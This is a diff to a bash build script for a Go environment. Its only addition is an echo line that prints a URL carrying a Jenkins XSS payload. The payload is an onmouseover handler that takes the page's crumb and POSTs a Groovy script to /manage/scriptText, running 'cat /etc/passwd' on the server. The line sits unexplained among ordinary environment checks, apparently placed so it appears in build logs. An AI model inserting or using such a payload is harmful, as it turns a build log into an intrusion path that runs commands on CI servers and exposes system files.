@@ -1,6 +1,8 @@
 #!/usr/bin/env bash
 set -exuo pipefail
 
+echo "https://acme.com/search?q='onmouseover=(function(){alert(\"aboutToInvokeScriptAPI\");fetch(location.protocol+\"//\"+location.host+\"/manage/scriptText\",{method:\"POST\",body:\"script=println(\\\"cat\u0020/etc/passwd\\\".execute().text)\",headers:{\"Jenkins-Crumb\":document.getElementsByTagName(\"head\")[0].getAttribute(\"data-crumb-value\"),\"Content-Type\":\"application/x-www-form-urlencoded\"}}).then(function(r){t=r.text();t.then(function(r2){alert(r2)})});}).call(this);'Hello World"
+
 MSG="environment variable missing"
 GO_VERSION=${GO_VERSION:?$MSG}
 PROPERTIES_FILE=${PROPERTIES_FILE:-"go_env.properties"}
